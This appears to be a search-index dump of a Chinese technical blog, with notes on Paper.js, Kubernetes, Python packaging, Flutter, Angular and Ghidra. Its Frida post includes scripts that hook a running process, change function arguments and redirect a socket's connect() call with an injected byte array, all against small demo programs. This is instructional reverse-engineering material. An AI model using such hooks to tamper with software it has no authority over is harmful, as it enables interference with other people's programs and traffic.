支持一次添加多个点，只需传入多个参数即可myPath.add(new Point(0, 0), new Point(100, 50)); // 支持在现有点之间插入新点myPath.insert(1, new Point(30, 50)); 12345678910111213141516171819// path 有一个 smooth 方法，可以用来将直线转成曲线var path = new Path();path.strokeColor = &quot;black&quot;;path.add(new Point(30, 75));path.add(new Point(30, 25));path.add(new Point(80, 25));path.add(new Point(80, 75));path.closed = true; // path 默认是 open 状态，设置为 true 实现闭合path.fullySelected = true;var copy = path.clone();copy.fullySelected = true;copy.position.x += 100;copy.smooth(); // 自带的 remove 方法可以用来彻底删除对象copy.remove(); 123456789101112// 创建 path 类型的圆var circle = new Path.Circle(center_point, radius);// 创建 path 类型的矩形var path = new Path.Rectangle(point, size);// 也可以传入 Rectangle 矩形作为实例化的参数var rect = new Rectangle(new Point(50, 50), new Size(100, 100));var path = new Path.Rectangle(rect);// 创建圆角矩形var radius = new Size(20, 20);var path = new Path.Rectangle(rect, radius); 1234// 创建正多边形，例如正三角形，正十边形等// new Path.RegularPolygon(center, sides, radius)var triangle = new Path.RegularPolygon(new Point(80, 70), 3, 50);var decagon = new Path.RegularPolygon(new Point(200, 70), 10, 50) 样式12345// 创建一个打勾符号var path = new Path(&#123; segments: [[40, 115], [80, 180], [200, 20]], selected: true&#125;); 1234// 直接赋值，改成红色path.strokeColor = &quot;#ff0000&quot;;// 或者使用 color 对象赋值path.strokeColor = new Color(0.5, 0, 0.5); 12// 填充颜色path.fillColor = &quot;#ff0000&quot;; 12// 设置线段粗细path.strokeWidth = 10; 12// path 两端样式path.storkeCap = &quot;round&quot;; 12// 中间点的样式设置为圆角path.strokeJoin = &quot;round&quot;; 12// 虚线path.dashArray = [10, 12]; 12345678910111213141516171819202122232425// path 的所有相关样式都存在 style 属性中，用该字段对其他 path 进行赋值，可实现样式的复制var firstPath = new Path.Circle(&#123; center: [80, 50], radius: 35&#125;);firstPath.strokeColor = &#x27;#ff0000&#x27;;firstPath.fillColor = &#x27;blue&#x27;;// secondPath doesn&#x27;t have a strokeColor yet:var secondPath = new Path.Circle(&#123; center: [160, 50], radius: 35&#125;);// Apply the style of firstPath to that of secondPath:secondPath.style = firstPath.style;// style 也可以单独实例化，之后再赋值var newStyle = &#123; strokeColor: &quot;#ff0000&quot;, fillColor: &quot;#000000&quot;, strokeWidth: 10,&#125;path.style = newStyle; 12345// 删除某个样式，只需将该样式的属性值设置为 null 即可path.fillColor = null;// 如果要删除所有新式，则只需将整个 style 属性设置为 null 即可path.style = null 1234567891011121314151617181920// 样式可以继承project.currentStyle = &#123; strokeColor: &quot;#000000&quot;&#125;// 新建的 path 会自动继承 project 的样式var firstPath = new Path.circle(&#123; center: [100, 100], radius: 50,&#125;);// 当 project 的样式更新后，后续新创建的 path 会继承新样式project.currentStyle.strokeWidth = 8;project.currentStyle.fillColor = &#x27;green&#x27;;var secondPath = new Path.Circle(&#123; center: [250, 100], radius: 50,&#125;); 1// path.simplify() 方法可用来简化组成 path 的 segment 数量，以便减少内存占用，提高性能 123456789101112131415// path.flatten(error) 方法可用来将曲线转成多段直线var path = new Path.Circle(&#123; center: [80, 50], radius: 35&#125;);// Select the path, so we can inspect its segments:path.selected = true;// Create a copy of the path and move it by 150 points:var copy = path.clone();copy.position.x += 150;// Flatten the copied path, with a maximum error of 4 points:copy.flatten(4); 交互有三个全局的鼠标事件，可以对鼠标操作进行响应，它们分别是 onMouseDown onMouseDrag onMouse 鼠标事件的属性： point：当前鼠标位置 downPoint：鼠标被按下时所在位置 lastPoint：上一次鼠标事件的位置 middlePoint：当前位置和上次位置的中点 delta：当前位置和上次位置的矢量 vector（up 事件该值为按下和松开两个位置的矢量） 12345678910111213// 每次按下鼠标时，就给路径添加一个新的点var path = new Path();path.strokeColor = &quot;black&quot;;function onMouseDown(e) &#123; path.add(e.point);&#125;// 通过设置全局变量 tool，可控制鼠标的移动距离（最大、最小、固定距离等）tool.minDistance = 20;tool.maxDistance = 20;tool.fixedDistance = 30;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"kubernetes mongodb operator","slug":"kubernetes mongodb operator","date":"2023-06-05T00:21:00.000Z","updated":"2024-09-21T06:41:39.396Z","comments":true,"path":"2023/06/05/kubernetes mongodb operator/","permalink":"http://example.com/2023/06/05/kubernetes%20mongodb%20operator/","excerpt":"","text":"早先在 Kubernetes 中管理 MongoDB statefulset 集群使用 sidecar 的方式，后续官方推出了 kubernetes mongodb operator，变得更加方便了，再也不需要额外的 sidecar pod 来监控数据库的状态了； 下载相关文件1git clone https://github.com/mongodb/mongodb-kubernetes-operator.git 创建资源定义创建 1kubectl apply -f config/crd/bases/mongodbcommunity.mongodb.com_mongodbcommunity.yaml 检查是否创建成功 1kubectl get crd/mongodbcommunity.mongodbcommunity.mongodb.com 创建角色资源1kubectl apply -k config/rbac/ --namespace &lt;my-namespace&gt; 检查是否创建成功 12345kubectl get role mongodb-kubernetes-operator --namespace &lt;my-namespace&gt;kubectl get rolebinding mongodb-kubernetes-operator --namespace &lt;my-namespace&gt;kubectl get serviceaccount mongodb-kubernetes-operator --namespace &lt;my-namespace&gt; 创建 operator1kubectl create -f config/manager/manager.yaml --namespace &lt;my-namespace&gt; 检查是否创建成功 1kubectl get pods --namespace &lt;my-namespace&gt;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"kubernetes","slug":"kubernetes","permalink":"http://example.com/tags/kubernetes/"}]},{"title":"Python import 用法","slug":"Python import 用法","date":"2022-03-13T07:05:00.000Z","updated":"2024-09-21T06:49:26.281Z","comments":true,"path":"2022/03/13/Python import 用法/","permalink":"http://example.com/2022/03/13/Python%20import%20%E7%94%A8%E6%B3%95/","excerpt":"","text":"常规导入模块 Modules一个 py 文件即相当于一个模块 Module；它可以被其他 py 导入，以便复用其中的代码； 12import mathmath.pi() 被导入的 py 文件，同时充当了一个命名空间（Namespace），可通过该命名空间访问其内部的变量和函数； 当使用 from A import B 时，就把 B 导入到全局命名空间中了，这个时候并没有导入 A；而且导入时 B 还可以重命名 B，例如： 1from math import pi as PI 包 PackagesPacage 也是一个模块，它跟普通模块的区别在于它内部包含了其他模块或者其他 Package Python 官方文档对 Package 的解释为，当一个模块的内置 path 属性有值时，即是一个 Package；个人感觉包和模块很像目录和文件的关系； 实际使用中，Package 通常是一个包含 py 文件和子目录的文件夹；当给某个文件夹中添加一个 init 文件时，它就变成了一个 pakcage；init 文件中可以放置内容，它表示当 package 被作为模块导入时，该模块包含的内容；它可以为空； 当一个文件夹没有 init 文件时，它仍然会被 Python 解释器视作一个 Package，只是它不是普通的 Package，而是一个特殊的 package，称为命名空间 Package； 通常在导入一个包时，并不导入它里面的子模块和子包。 发现一个有意思的点，当使用 from A import B 时，虽然 A 没有导入进来，但是 B 和 A 的上下级关系是存在的。因此如果有另外一行代表导入了 A，那么即使 A 的 init 文件中没有导入 B，也仍然可以通过 A.B 来访问 B； 使用 import A.B.C 来导入时，A.B. 表示的是路径关系好像；而且一旦导入成功，B 和 C 的上下级关系就建立了；即使 B 的 init 文件中原本默认没有导入 C，也因为这种关系的建立，使得 B.C 的访问能够成功； 当一个包中的 init 文件为空时，那么导入这个包时，只导入了一个命名空间，并未导入任何具体的模块； 注意：当导入一个模块时，除了会导入模块中的内容外，还会同时创建一个包含该内容的命名空间；当使用不同的导入方法时，同一个模块可以隶属于不同的命名空间；即可以通过多个命名空间访问到相同的模块； 模块本质上面是一个对象，因此可以通过对象的内置方法来访问来模块中的内容，示例如下： 12import mathmath.__dict__[&#x27;pi&#x27;] 在 init 文件中导入包中的模块，可以让包的使用者更方便的使用这些模块，而无须记住相应的路径 绝对导入和相对导入如果代码只在本地使用，不需要共享给他人使用时，使用绝对路径导入是一个不错的方法。但是如果它成为一个包，需要被其他人复用时，那么使用绝对路径就会报错了，此时需要在包中使用相对路径。同时引用该包的人，可通过 pip 安装该包。安装后，包就会被存放在默认的 site_packages 文件夹中，这样在运行脚本时就可以被解释器找到；不然就得修改 PYTHONPATH 环境变量或者调用 sys.path 方法添加包的路径； 当解释器遇到 import 语句时，它会到三个地方寻找包，分别如下： 当前脚本所在的目录； 环境变量 PYTHONPATH 指向的目录； pip 存放依赖的目录； 安装本地包添加配置文件 setup.py，在里面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#!/usr/bin/env python# -*- coding: utf-8 -*-import ioimport osimport sysfrom shutil import rmtreefrom setuptools import find_packages, setup, Command# Package meta-data.NAME = &#x27;mypackage&#x27;DESCRIPTION = &#x27;My short description for my project.&#x27;URL = &#x27;https://github.com/me/myproject&#x27;EMAIL = &#x27;me@example.com&#x27;AUTHOR = &#x27;Awesome Soul&#x27;REQUIRES_PYTHON = &#x27;&gt;=3.6.0&#x27;VERSION = &#x27;0.1.0&#x27;# What packages are required for this module to be executed?REQUIRED = [ # &#x27;requests&#x27;, &#x27;maya&#x27;, &#x27;records&#x27;,]# What packages are optional?EXTRAS = &#123; # &#x27;fancy feature&#x27;: [&#x27;django&#x27;],&#125;# The rest you shouldn&#x27;t have to touch too much :)# ------------------------------------------------# Except, perhaps the License and Trove Classifiers!# If you do change the License, remember to change the Trove Classifier for that!here = os.path.abspath(os.path.dirname(__file__))# Import the README and use it as the long-description.# Note: this will only work if &#x27;README.md&#x27; is present in your MANIFEST.in file!try: with io.open(os.path.join(here, &#x27;README.md&#x27;), encoding=&#x27;utf-8&#x27;) as f: long_description = &#x27;\\n&#x27; + f.read()except FileNotFoundError: long_description = DESCRIPTION# Load the package&#x27;s __version__.py module as a dictionary.about = &#123;&#125;if not VERSION: project_slug = NAME.lower().replace(&quot;-&quot;, &quot;_&quot;).replace(&quot; &quot;, &quot;_&quot;) with open(os.path.join(here, project_slug, &#x27;__version__.py&#x27;)) as f: exec(f.read(), about)else: about[&#x27;__version__&#x27;] = VERSION# Where the magic happens:setup( name=NAME, version=about[&#x27;__version__&#x27;], description=DESCRIPTION, long_description=long_description, long_description_content_type=&#x27;text/markdown&#x27;, author=AUTHOR, author_email=EMAIL, python_requires=REQUIRES_PYTHON, url=URL, packages=find_packages(exclude=[&quot;tests&quot;, &quot;*.tests&quot;, &quot;*.tests.*&quot;, &quot;tests.*&quot;]), # If your package is a single module, use this instead of &#x27;packages&#x27;: # py_modules=[&#x27;mypackage&#x27;], # entry_points=&#123; # &#x27;console_scripts&#x27;: [&#x27;mycli=mymodule:cli&#x27;], # &#125;, install_requires=REQUIRED, extras_require=EXTRAS, include_package_data=True, license=&#x27;MIT&#x27;, classifiers=[ # Trove classifiers # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers &#x27;License :: OSI Approved :: MIT License&#x27;, &#x27;Programming Language :: Python&#x27;, &#x27;Programming Language :: Python :: 3&#x27;, &#x27;Programming Language :: Python :: 3.6&#x27;, &#x27;Programming Language :: Python :: Implementation :: CPython&#x27;, &#x27;Programming Language :: Python :: Implementation :: PyPy&#x27; ], # $ setup.py publish support. cmdclass=&#123; &#x27;upload&#x27;: UploadCommand, &#125;,) 安装命令 1python -m pip install -e . Resources 导入在 3.7 版本之后，静态资源文件也支持像包一样处理，只需要在资源所有的文件中添加一个 init 文件即可；然后引入包后，只需要使用内置的 importlib.resources 模块，即可实现对资源文件的读取 假设包中有如下资源： 12345books/│├── __init__.py├── alice_in_wonderland.png└── alice_in_wonderland.txt 则可以通过如下方式读取其中的资源文件： 1234from importlib import resourceswith resources.open_text(&quot;books&quot;, &quot;alice.txt&quot;) as fid: alice = fid.readlines() 示例二： 1234data/│├── __init__.py└── WPP2019_TotalPopulationBySex.csv 1234from importlib import resourceswith resources.open_text(&quot;data&quot;, &quot;WPP2019_TotalPopulationBySex.csv&quot;) as fid: rows = csv.DictReader(fid)","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Python Package 配置","slug":"python package 配置","date":"2022-03-13T06:43:00.000Z","updated":"2024-09-21T06:53:29.459Z","comments":true,"path":"2022/03/13/python package 配置/","permalink":"http://example.com/2022/03/13/python%20package%20%E9%85%8D%E7%BD%AE/","excerpt":"","text":"步骤 命名给 pip 使用的名字可以长一点和详细一点，这样更容易一眼看懂这个包是干嘛的，例如 realpython-reader；而用于导入时的包名称可以短一点，例如 import reader；这两点可以在 setup 文件中配置实现； 1pip install realpython-reader 12&gt;&gt;&gt; import reader&gt;&gt;&gt; help(reader) 配置有三种配置方法，分别是： setup.py：最传统的一种 setup.cfg：用静态文件来替代 setup 脚本 pyproject.toml：用新格式静态文件，这是最新的标准，但是这种方式的缺点是不支持可编辑模块，此时需要额外写一个简单的 setup.py 来实现可编辑模块的安装；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"Frida","slug":"Frida","date":"2022-01-07T00:48:00.000Z","updated":"2024-09-21T04:01:53.593Z","comments":true,"path":"2022/01/07/Frida/","permalink":"http://example.com/2022/01/07/Frida/","excerpt":"","text":"基本概念Frida 是一个用来向目标进程动态注入指令的工具，它使用 python 编写，因此可在多种操作系统中使用，例如 Windows, MacOS, Linux, Android, iOS 等等； 当要在 Android 上面使用时，需要先使用 root 权限运行 frida-server 进程，然后将手机通过 USB 线连接到电脑上，开启调试模式，之后就可以通过在 PC 端运行脚本实现预期效果（原理：PC 端脚本会发送指令给 frida-server 执行）； 代码示例函数注入先用 c 语言快速定义一个程序 1234567891011121314151617181920// hello.c#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;// 函数 func 接受一个参数，并打印出该参数值void func (int n) &#123; printf (&quot;Number: %d\\n&quot;, n);&#125;int main (int argc, char * argv[]) &#123; int i = 0; // 函数在编译成可执行文件后，都会有一个虚拟内存地址，此处将该地址打印出来，以方便进行 hook printf (&quot;func() is at %p\\n&quot;, func); while (1) &#123; func (i++); sleep (1); &#125;&#125; 然后调用编译踌躇，编译成可运行的程序，用来测试： gcc -Wall hello.c -o hello 读取函数参数12345678910111213141516171819202122# hook.pyfrom __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;hello&quot;) # 绑定名称为 hello 的进程# 通过 ptr 指针值绑定内存中指定的位置script = session.create_script(&quot;&quot;&quot; Interceptor.attach(ptr(&quot;%s&quot;), &#123; onEnter: function(args) &#123; send(args[0].toInt32()); &#125; &#125;);&quot;&quot;&quot; % int(sys.argv[1], 16))def on_message(message, data): print(message)script.on(&#x27;message&#x27;, on_message)script.load()sys.stdin.read() 修改函数参数123456789101112131415161718# modify.pyimport fridaimport syssession = frida.attach(&quot;hello&quot;)# 此处脚本通过绑定指定内存地址中的函数，当进入该函数时，就将参数列表中的第一个参数的值修改为 1337script = session.create_script(&quot;&quot;&quot;Interceptor.attach(ptr(&quot;%s&quot;), &#123; onEnter: function(args) &#123; args[0] = ptr(&quot;1337&quot;); &#125;&#125;);&quot;&quot;&quot; % int(sys.argv[1], 16))script.load()sys.stdin.read() 替换函数12345678910111213141516# call.pyimport fridaimport syssession = frida.attach(&quot;hello&quot;)# 调用 NativeFunction 在指定位置自定义了一个新函数，当该位置的函数被调用时，就会触发自定义的函数# NativeFunction 函数的第二个参数用来指定返回值的类型，此处为 void，表示没有返回值script = session.create_script(&quot;&quot;&quot; var func = new NativeFunction(ptr(&quot;%s&quot;), &#x27;void&#x27;, [&#x27;int&#x27;]); func(1911); func(1911); func(1911);&quot;&quot;&quot; % int(sys.argv[1], 16))script.load() 注入字符串123456789101112131415161718192021// hi.c 定义一个接受字符串参数的函数，并编译成可执行程序#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int func(const char *s) &#123; printf(&quot;String: %s\\n&quot;, s); return 0;&#125;int main(int argc, char* argv[]) &#123; const char* s = &quot;Testing!&quot;; printf(&quot;f() is at %p\\n&quot;, func); printf(&quot;s is at %p\\n&quot;, s); while(1) &#123; func(s); sleep(1); &#125;&#125; 123456789101112131415161718192021222324from __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;hi&quot;)# NativeFunction 函数的第二个参数用来指定返回值的类型，此处为 int# 第三个参数是一个列表，用来存放输入类型# 注意：在注入字符串时，传递给自定义函数的值是字符串的指针# 注意：此处使用了 Memory.allocUtf8String 来创建自定义字符串，事实上，还有很多相关的方法可用# 例如：Memory.alloc(), Memory.protect() 等script = session.create_script(&quot;&quot;&quot; var st = Memory.allocUtf8String(&#x27;TESTMEPLZ!&#x27;); var func = new NativeFunction(ptr(&quot;%s&quot;), &#x27;int&#x27;, [&#x27;pointer&#x27;]); func(st);&quot;&quot;&quot; % int(sys.argv[1], 16))def on_message(message, data): print(message)script.on(&#x27;message&#x27;, on_message)script.load() 注入对象12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// client.c#include &lt;arpa/inet.h&gt;#include &lt;errno.h&gt;#include &lt;netdb.h&gt;#include &lt;netinet/in.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(int argc, char* argv[]) &#123; int sock_fd, i, n; struct sockaddr_in serv_addr; unsigned char* b; const char* message; char recv_buf[1024]; if (argc != 2) &#123; fprintf(stderr, &quot;Usage: %s&lt;ip of server&gt;\\n&quot;, argv[0]); return 1; &#125; printf(&quot;connect() is at: %p\\n&quot;, connect); if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) &#123; perror(&quot;Unable to create socket&quot;); return 1; &#125; bzero(&amp;serv_addr, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_port = htons(5000); if (inet_pton(AF_INET, argv[1], &amp;serv_addr.sin_addr) &lt;= 0) &#123; fprintf(stderr, &quot;Unable to parse IP address\\n&quot;); return 1; &#125; printf(&quot;\\nHere&#x27;s the serv_addr buffer:\\n&quot;); b = (unsigned char *) &amp;serv_addr; for (i = 0; i != sizeof(serv_addr); i++) &#123; printf(&quot;%s%02x&quot;, (i != 0) ? &quot; &quot; : &quot;&quot;, b[i]); &#125; printf(&quot;\\n\\nPress ENTER key to Continue\\n&quot;); while(getchar() == EOF &amp;&amp; ferror(stdin) &amp;&amp; errno == EINTR) &#123; ; &#125; if (connect(sock_fd, (struct sockaddr*) &amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; perror(&quot;Unable to connnect&quot;); return 1; &#125; message = &quot;Hello there!&quot;; if (send(sock_fd, message, strlen(message), 0) &lt; 0) &#123; perror(&quot;Unable to send&quot;); return 1; &#125; while(1) &#123; n = recv(sock_fd, recv_buf, sizeof(recv_buf) - 1, 0); if (n == -1 &amp;&amp; errno == EINTR) &#123; continue; &#125; else if (n &lt;= 0) &#123; break; &#125; recv_buf[n] = 0; fputs(recv_buf, stdout); &#125; if (n &lt; 0) &#123; perror(&quot;Unable to read&quot;); &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334from __future__ import print_functionimport fridaimport syssession = frida.attach(&quot;client&quot;)script = session.create_script(&quot;&quot;&quot; send(&#x27;Allocating memory and writing bytes...&#x27;); var st = Memory.alloc(16); st.writeByteArray([0x02, 0x00, 0x13, 0x89, 0x7F, 0x00, 0x00, 0x01, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30]); Interceptor.attach(Module.getExportByName(null, &#x27;connect&#x27;), &#123; onEnter: function(args) &#123; send(&#x27;Injecting malicious byte array:&#x27;); args[1] = st; &#125;, // onLeave: function(retval) &#123; // retval.replace(0); // &#125; &#125;);&quot;&quot;&quot;)def on_message(message, data): if message[&#x27;type&#x27;] == &#x27;error&#x27;: print(&quot;[!]&quot; + message[&#x27;stack&#x27;]) elif message[&#x27;type&#x27;] == &#x27;send&#x27;: print(&quot;[i]&quot; + message[&#x27;payload&#x27;]) else: print(message)script.on(&#x27;message&#x27;, on_message)script.load()sys.stdin.read() 注入指令 可以直接使用 js 编写注入函数 步骤 运行 frida-server，以便 PC 端的指令可发送到手机端；方法：adb shell 连通手机 shell，运行 frida-server 可执行文件，按官网教程，路径为 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 运行 frida-ls-devices，列出当前连接的设备，得到 ID 号； 运行 frida-ps -Ua，列出当前运行的进程，得到进程名称； 运行 frida -D -f -l --no-pause 示例","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"安全","slug":"安全","permalink":"http://example.com/tags/%E5%AE%89%E5%85%A8/"}]},{"title":"Ghidra","slug":"Ghidra","date":"2022-01-04T01:04:00.000Z","updated":"2024-09-21T04:04:46.345Z","comments":true,"path":"2022/01/04/Ghidra/","permalink":"http://example.com/2022/01/04/Ghidra/","excerpt":"","text":"基本概念Ghidra 是一个逆向工具，它除了内置功能外，还支持通过插件实现功能扩展； Ghidra 基于项目 project 来管理要所逆向工程的内容，因此第一步需要先创建一个项目，或者导入一个项目； 新创建的项目并没有什么数据，第二步需要导入相关文件，才有办法实现后续的操作；导入文件时，会生成 program； Ghidra tool：插件管理器，当运行某个插件时，会新开一个窗口，可在 “Running Tools” 栏目查看当前正在运行的插件列表； Ghidra 本体并不负责实际的功能，各功能由插件来完成，当运行某个插件时，会新打开一个插件窗口，该窗口中有该插件的各相关功能； 使用方法创建项目 新建项目：File -&gt; New project -&gt; Non-shared Project -&gt; 选择项目存放目录 如果之前已经创建过项目，则可以使用 Open Project 导入之前的项目文件； 运行插件 启动插件：Tool Chest 栏，点击 code browser 图标 使用插件 导入文件：File -&gt; Import file，导入后会开始解析文件，需要较长的时间（原因：对代码进行反汇编），耐心等待解析完成； 搜索位置 按名称搜索：Search -&gt; For Strings 按行号搜索：Search -&gt; For Scalars","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"}]},{"title":"Flutter","slug":"Flutter","date":"2022-01-01T07:07:00.000Z","updated":"2024-09-21T03:59:49.662Z","comments":true,"path":"2022/01/01/Flutter/","permalink":"http://example.com/2022/01/01/Flutter/","excerpt":"","text":"基本概念Vue 中的组件在这里叫做 Widget，组件可以包含组件，组件可以通过继承实现快速构建；组件通过内置的 build 方法来实现渲染，有点像小程序中的 setData；组件也有一些内置的属性，用来设置组件的相关信息，例如标题，主体等； 官方的 Material 组件库里面有很多前人写好的组件，可以用来快速构建应用；这些组件自带样式，可以自适应不同的终端，非常方便；有些组件甚至可以只负责样式，然后再内置包含内容的其他组件，很灵活，实现了样式和内容的解耦； 有个 pubspec.yaml 文件很像 nodejs 里面的 package.json 文件，用来定义项目的相关信息以及依赖的库；同时还有一个 pub.dev 仓库网站，类似 nodejs 里面的 npm 仓库，可以方便的实现第三方库的集中管理和下载；另外还有一个 pubspec.lock 文件，貌似也跟 nodejs 里面的 package_json.lock 功能差不多； flutter pub 命令很像 npm ，用来管理包，例如 flutter pub get 类似 npm install，用来安装依赖文件中指定的各种包，flutter pub add 则用来添加包（发现添加后，好像并没有自动下载，而是需要再运行一下 pub get 才行，但是看 pub.dev 网站的文档好像只需要 add 就可以了）； StateLessWidget 表示无状态的应用，即生成后里面的数据就不可变了；如果里面的数据需要可变的，则需要使用 StatefulWidget；但是很有意思的是 StatefulWidget 的实现是在它里面再包含一个 State 类来实现的可变状态（猜测这样是为了兼容性？）； 通过在类名添加下划线前缀，在 Dart 中表示强制私有；在创建 StatefulWidget 时，编辑器自动创建的 State 类即默认为私有的； 创建 State 时，有一个很有意思的点，即新创建的 state 并不是直接继承某个 StateWidget 来实现的，而是给 State 传递一个 StatefulWidegt 来实现，示例如下： 12class _RandomWordsState extends State&lt;RandomWords&gt; &#123;&#125;// 此处的 RandomWords 是一个 StatefulWidget Widget 类有一个内置的 build 方法，用来初始化对象，一般继承父类后，会通过重写 build 方法覆盖父类的方法； StatefulWidget 类有一个内置的 createState 方法，用来初始化 State 对象，通过对其进行重写，实现自定义的 State； 在类内部定义的函数，直接就是该类的方法，如果加上下划线作为前缀，则成为该类的私有方法； ListView 有一个内置的 itemBuilder 方法，貌似列表滚动到底后，会自动触发该方法； 布局在 Flutter 里面，一切均是 Widget，它既负责展示，也负责交互，很像 Vue 里面的组件； 通常来说，内置的组件已经设定好了默认样式；如果想修改这些默认样式，例如 margin, padding, border, backgroud 等，有两种方法： 通过外加一层 Container 的 Widget 来实现，自定义的样式放在 Container 当中去实现，同时将内置 Widget 放在 Container 中，而不是去修改内置 Widget，这样实现了更好的解耦，也方便将来进行统一的管理，例如当更新某些全局设置时，所有内置 Widget 都会相应更新，而不会因为自行修改导致失效； 直接修改 Widget 的相关属性来实现，例如 color, font, weight 等； 有一些 widget 是专门负责布局排版的，统称为 layout widget，主要有以下三类： single-child：只包含一个子元素； multi-child：包含多个子元素； silver：其他一些类型； 所有的 layout widget 不外乎使用以下两种方式中的一种来添加子元素 child ：仅有单个子元素，例如 Center，Container 等； children ：拥有多个子元素，例如 Row，Column，ListView 或 Stack 等； 大部分 Widget 都有一个 build 方法，当该方法被调用时，将生成界面； 常用 WidgetScaffold：包含顶部标题栏，标题，背景色等元素； Row：表示一行，里面可以嵌套各种东西； Column：表示一列，里面可以嵌套各种东西； Row 或 Column 内部元素的对齐，通过其属性 mainAxisAllignment 和 crossAxisAlignment 来实现； 12345678Row( mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [ Image.asset(&#x27;images/pic1.jpg&#x27;), Image.asset(&#x27;images/pic2.jpg&#x27;), Image.asset(&#x27;images/pic3.jpg&#x27;), ],); 如果图片的大小跟所设定的区域尺寸不匹配，可通过将其放到 Expanded 中，来实现自动缩放，示例如下： 1234567891011121314Row( crossAxisAlignment: CrossAxisAlignment.center, children: [ Expanded( child: Image.asset(&#x27;images/pic1.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic2.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic3.jpg&#x27;), ), ],); 123456789101112131415Row( crossAxisAlignment: CrossAxisAlignment.center, children: [ Expanded( child: Image.asset(&#x27;images/pic1.jpg&#x27;), ), Expanded( flex: 2, child: Image.asset(&#x27;images/pic2.jpg&#x27;), ), Expanded( child: Image.asset(&#x27;images/pic3.jpg&#x27;), ), ],); 默认情况下，Row 或 Column 内部的元素会占据整行或整列的空间，如果需要各个元素按指定尺寸挨着显示，则可以通过设置 mainAxisSize 来实现 12345678910Row( mainAxisSize: MainAxisSize.min, // 设置尺寸 children: [ Icon(Icons.star, color: Colors.green[500]), Icon(Icons.star, color: Colors.green[500]), Icon(Icons.star, color: Colors.green[500]), const Icon(Icons.star, color: Colors.black), const Icon(Icons.star, color: Colors.black), ],)","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"Dart","slug":"Dart","permalink":"http://example.com/tags/Dart/"},{"name":"前端","slug":"前端","permalink":"http://example.com/tags/%E5%89%8D%E7%AB%AF/"}]},{"title":"Angularjs","slug":"Angularjs","date":"2021-11-17T23:55:00.000Z","updated":"2024-09-21T09:57:12.383Z","comments":true,"path":"2021/11/18/Angularjs/","permalink":"http://example.com/2021/11/18/Angularjs/","excerpt":"","text":"组件组件由三部分组成： class：数据、功能（函数）； template：HTML 模板 style：样式 在 HTML 标签中，点击事件绑定用以下方法来表示： 1&lt;button (click)=&quot;doSomething&quot;&gt;do something&lt;button&gt; HTML 模板中所需要的数据，通过使用依赖注入的方法，实现动态更新的效果，示例如下： 单向绑定 1&lt;h2&gt;&#123;&#123;hero.name | uppercase&#125;&#125; Details&lt;/h2&gt; 此处的“| uppercase” 是一个管道连接符 + 一个内置格式转换函数，它可以将字符串转成大写。在 angular 中，这种方式被称为 pipe 函数，包括 DatePipe, UppercasePipe, LowercasePipe, CurrencyPipe, DecimalPipe, PercentPipe 等； 双向绑定 1&lt;input id=&quot;hero-name&quot; [(ngModel)]=&quot;hero.name&quot; placeholder=&quot;name&quot;&gt; 此处通过 [(ngModel)] 实现双向绑定，这样就不需要在 JS 中监听 input 事件，并手工更新 JS 中的数据，确实方便很多； 服务组件的数据可以依赖服务来注入，实现数据和组件之间的解耦。这样当数据的实现发生变化时，不需要变更组件，只需要更新服务内部的代码即可；数据来源可以是本地存储、硬编码、网络接口等； 通过将服务注入组件内部的 constructor 构建函数，之后在组件的 onInit hook 中调用初始化函数，来实现内部对数据的自定义处理 此处非常有意思，首先外部引入的 HeroService 本身就是一个类（或函数），已经实现了第一层的解耦，但之后在组件中引入该服务时，只是将其添加为组件 Class 的私有属性，同时组件又定义了自己的 Service 函数，在该 Service 函数中调用 HeroSerivice，这样一样就实现了双重解耦，如果 HeroService 的实现有任何变化，都只需要更新组件自己定义的 Service 函数，而不会影响到组件内部的其他位置的代码； 理论上任何读取外部数据的场景，都最好自定义一个函数，来实现解耦，避免内部代码跟外部数据的实现之间产生耦合； 创建服务的命令：ng generate service @Injectable 修饰符用来定义服务的元属性，例如定义可注入的范围等（root 表示全局可注入），有点类似 @component 用来定义组件的元属性一样； 当服务的数据来源是网络接口时，数据的获得是异步的，因此服务需要支持该异步场景，对异步状态下的数据进行处理； 为了支持异常，ng 引入了一个 Observable 类，这个类有点像是 Promise，它会返回一个对象，该对象有一个 Subscribe 方法；该方法接受一个回调函数，并将最终数据做为参数，传递给回调函数； constructor 